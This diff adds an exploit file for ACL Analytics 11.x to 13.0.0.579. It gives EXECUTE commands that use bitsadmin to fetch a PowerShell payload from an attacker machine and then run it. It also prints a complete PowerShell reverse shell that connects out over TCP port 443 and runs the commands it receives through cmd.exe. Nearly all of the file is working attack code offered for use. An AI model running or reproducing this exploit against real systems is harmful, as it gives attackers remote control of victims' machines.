@@ -1,0 +1,90 @@
+# Exploit Title: Arbitrary Code Execution
+# Google Dork: N/A
+# Date: 03-07-2018
+# Exploit Author: Clutchisback1
+# Vendor Homepage: https://www.acl.com
+# Software Link: https://www.acl.com/products/acl-analytics/
+# Version: 11.x - 13.0.0.579
+# Tested on: Windows 7 pro SP1 x86
+
+#########################################################################
+#                    
+#                
+#   Clutchisback1 /\/\/\ I'll get OSCP one day! /\/\/\
+#   Welcome to A_C_SHELLLLLL!! 
+#   All Glory to Yeshua
+#   Shoutouts to my Menotor: Ch33z_plz for teaching me everyday
+#   and my Offsec Mentor: T0w3ntum introducing me to netsec!
+#   (I have consent for those mentions :D)
+#                
+#                 
+#########################################################################
+
+
+EXECUTE 'bitsadmin /transfer myDownloadJob /download /priority high http://127.0.0.1/shell.ps1 c:\temp\shell.ps1'
+
+
+EXECUTE "powershell C:\temp\shell.ps1"
+
+Description/Usage:
+Please use the script below to create a reverse shell payload that will be downloaded form your attacking machine and uploaded to the target host by bitsadmin and placed in the target c:\temp directory and saved as shell.ps1.
+The second `Execute` command will execute the stored payload
+
+
+Powershell Reverse Shell was downloaded from here: https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5
+
+$socket = new-object System.Net.Sockets.TcpClient('127.0.0.1', 443);
+if($socket -eq $null){exit 1}
+$stream = $socket.GetStream();
+$writer = new-object System.IO.StreamWriter($stream);
+$buffer = new-object System.Byte[] 1024;
+$encoding = new-object System.Text.AsciiEncoding;
+do
+{
+ $writer.Flush();
+ $read = $null;
+ $res = ""
+ while($stream.DataAvailable -or $read -eq $null) {
+  $read = $stream.Read($buffer, 0, 1024)
+ }
+ $out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
+ if(!$out.equals("exit")){
+  $args = "";
+  if($out.IndexOf(' ') -gt -1){
+   $args = $out.substring($out.IndexOf(' ')+1);
+   $out = $out.substring(0,$out.IndexOf(' '));
+   if($args.split(' ').length -gt 1){
+                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
+                $pinfo.FileName = "cmd.exe"
+                $pinfo.RedirectStandardError = $true
+                $pinfo.RedirectStandardOutput = $true
+                $pinfo.UseShellExecute = $false
+                $pinfo.Arguments = "/c $out $args"
+                $p = New-Object System.Diagnostics.Process
+                $p.StartInfo = $pinfo
+                $p.Start() | Out-Null
+                $p.WaitForExit()
+                $stdout = $p.StandardOutput.ReadToEnd()
+                $stderr = $p.StandardError.ReadToEnd()
+                if ($p.ExitCode -ne 0) {
+                    $res = $stderr
+                } else {
+                    $res = $stdout
+                }
+   }
+   else{
+    $res = (&"$out" "$args") | out-string;
+   }
+  }
+  else{
+   $res = (&"$out") | out-string;
+  }
+  if($res -ne $null){
+        $writer.WriteLine($res)
+    }
+ }
+}While (!$out.equals("exit"))
+$writer.close();
+$socket.close();
+$stream.Dispose()
+END
